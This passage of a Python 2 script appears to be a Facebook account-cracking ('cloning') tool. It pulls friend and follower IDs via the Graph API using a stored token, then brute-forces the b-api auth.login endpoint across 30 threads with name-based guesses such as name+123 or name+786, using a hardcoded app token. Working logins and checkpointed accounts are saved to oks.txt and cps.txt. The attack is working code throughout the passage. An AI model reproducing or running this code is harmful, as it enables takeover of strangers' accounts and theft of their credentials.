		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="2":
		os.system("clear")
		print(logo)
                print("\033[1;97m-------------------------------------------------")
		idt = raw_input("\033[1;97m[!] Enter Follower ID/Username ➤ \x1b[1;32m")
                print("\033[1;97m-------------------------------------------------")
		print("")
                print("\033[1;97m-------------------------------------------------")
		print("\x1b[1;32m[!] Password : 123,1234,786").center(50)
                print("\033[1;97m-------------------------------------------------")
		print("")
                print("\033[1;97m-------------------------------------------------")
		p1 = raw_input("[1] Password : ")
		p2 = raw_input("[2] Password : ")
		p3 = raw_input("[3] Password : ")
                print("\033[1;97m-------------------------------------------------")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
                        print("\033[1;97m-------------------------------------------------")
			print("[!] Cloning User Name : \033[1;92m"+q["name"])
		except KeyError:
			print("\033[1;91mInvalid link/Username OR Has Privacy").center(50)
			print("")
			time.sleep(2)
			string()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="3":
	    menu()
	else:
		print("")
		time.sleep(2)
		print("\033[1;91mSelect valid option").center(50)
		print("")
		time.sleep(2)
		string()
        print("\033[1;97m-------------------------------------------------")
	print("\033[1;97m[!] Total User IDs : \x1b[1;32m"+str(len(id)))
	print("\033[1;97m[!] Cracking Started....")
	print("\033[1;97m[!] Plz Wait Clone Account Will Be Appear Here")
	print("\033[1;97m-------------------------------------------------")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		ranagent = random.choice(agents)
		biran = random.choice(birth)
		session = requests.Session()
		session.headers.update({'User-Agent': ranagent})
		try:
			pass1 = name.lower() + p1
			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
			q = json.loads(data)
			if "access_token" in q:
				print("\033[1;92m[RISHU-OK] "+uid+" - "+pass1+" - "+name+"\033[0;97m") 
				ok = open("/sdcard/oks.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print("\033[1;91m[RISHU-CP] "+uid+" - "+pass1+" - "+name+"\033[0;97m" )
					cp = open("/sdcars/cps.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
                                        pass2 = name.lower() + p2
					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
					q = json.loads(data)
					if "access_token" in q:
                                                print("\033[1;92m[RISHU-OK] "+uid+" - "+pass2+" - "+name+"\033[0;97m") 
				                ok = open("/sdcard/oks.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print("\033[1;91m[RISHU-CP] "+uid+" - "+pass2+" - "+name+"\033[0;97m" )
					                cp = open("/sdcard/cps.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
		                                        pass3 = name.lower() + p3
							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
							q = json.loads(data)
							if "access_token" in q:
								print("\033[1;92m[RISHU-OK] "+uid+" - "+pass3+" - "+name+"\033[0;97m") 
				                                ok = open("/sdcard/oks.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print("\033[1;91m[RISHU-CP] "+uid+" - "+pass3+" - "+name+"\033[0;97m" )
					                                cp = open("/sdcard/cps.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
																
																
																
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;97m-------------------------------------------------")
	print("\033[1;97m[!] The cloning process has been completed")
	print("\033[1;97m[!] Total \x1b[1;31mCP\x1b[1;37m/\x1b[1;32mOK\x1b[1;37m: "+str(len(cps))+"/"+str(len(oks)))
	print("\033[1;97m[!] CP file saved as : \x1b[1;31mcps.txt")
	print("\033[1;97m[!] OK file saved as : \x1b[1;32moks.txt")
        print("\033[1;97m-------------------------------------------------")
	raw_input("\033[1;97m[!] Press enter to back")
	menu()		
	
def view():
	os.system("clear")
        print(logo)
	print("")
	print("\033[1;93mYour Login Token\033[1;0m").center(50)
	print("")
	os.system("cat access_token.txt")
	print("")
	raw_input("\033[1;97m[!] Press enter to main menu ")
	menu()
		      
def user_agents():
	os.system("clear")
	print logo
	print("")
        print("\033[1;97m-------------------------------------------------")
	print("[1] Get User Agents")
	print("[2] Change User Agents")
	print("[3] Remove User Agents")
	print("[4] Back To Main Menu")
	print("\033[1;97m-------------------------------------------------")
	user()
def user():
	user_off = raw_input("\033[1;97m[!] Select Option ➤ \x1b[1;32m")
	if user_off =="1":
		os.system("xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8")
		time.sleep(2)
		user_agents()
	elif user_off =="2":
		change_agnt()
	elif user_off =="3":
		os.system("rm -rf ugent.txt")
		time.sleep(1)
		print("User Agent Was Remove Successful").center(50)
		menu()
	elif user_off =="4":
		menu()
	else:
		print("")
		time.sleep(2)
		print("Please Select A Valid Option").center(50)
		print("")
		time.sleep(2)
		menu()
		      
def change_agnt():
	os.system("clear")
	print logo
	print("")
	os.system("rm -rf ugent.txt")
	agent = raw_input("[!] Put User Agents : ")
	try:
		uan = open('ugent.txt','w')
		uan.write(agent)
		uan.close()
		print("")
		time.sleep(2)
		print("Change User Agent Has Successfully").center(50)
		print("")
		time.sleep(2)
		user_agents()
	except (KeyError, IOError):
		print("")
		time.sleep(2)
		print("User Agents Has Invalid Or Failed").center(50)
		print("")
		time.sleep(2)
		menu()
		
def result():
	os.system("clear")
	print logo
	print("")
        print("\033[1;97m-------------------------------------------------")
	print("[1] Result Cps id")
	print("[2] Result Oks id")
	print("[0] Back")
        print("\033[1;97m-------------------------------------------------")
	res()
def res():
	res = raw_input("\033[1;97m[!] Select Option ➤ \x1b[1;32m")
	if res =="1":
		cps_ids()
	elif res =="2":
		oks_ids()
	elif res =="0":
		menu()
	else:
		print("")
		time.sleep(2)
		print("Please Select a valid option").center(50)
		print("")
		time.sleep(2)
		menu()

def cps_ids():
	os.system("clear")
	print logo
	print("")
	print("\x1b[1;32mYour Cloning Cps Result").center(50)
	print("")
	time.sleep(2)
	try:
		os.system("cat cps.txt")
		time.sleep(2)
		print("")
		print("")
		raw_input("\t\033[0;97mPress enter to download cps file")
		time.sleep(1)
		os.system("clear")
		print logo
		print("")
		print("")
		print("\033[0;92mCongrat, cps file has been download success\033[1;0m").center(50)
		print("")
		print("")
		time.sleep(2)
		raw_input("\t\x1b[1;37mPress enter back")
		time.sleep(1)
		result()
	except IOError:
		print("")
		print("")
		print("\033[1;91mCps ids not found or has invalid").center(50)
		time.sleep(2)
		result()
		
def oks_ids():
	os.system("clear")
	print logo
	print("")
	print("\x1b[1;32mYour Cloning Oks Result").center(50)
	print("")
	time.sleep(2)
	try:
		os.system("cat oks.txt")
		print("")
		time.sleep(2)
		print("")
		print("")
		raw_input("\t\033[0;97mPress enter to download oks file")
		time.sleep(1)
		os.system("clear")
		print logo
		print("")
		print("")
		print("\033[0;92mCongrat, oks file has been download success\033[1;0m").center(50)
		print("")
		print("")
		time.sleep(2)
		raw_input("\t\x1b[1;37mPress enter back")
		time.sleep(1)
		result()
	except IOError:
		print("")
		print("")
		print("\033[1;91mOks ids not found or has invalid").center(50)
		time.sleep(2)
		result()
if __name__ == '__main__':
	menu()
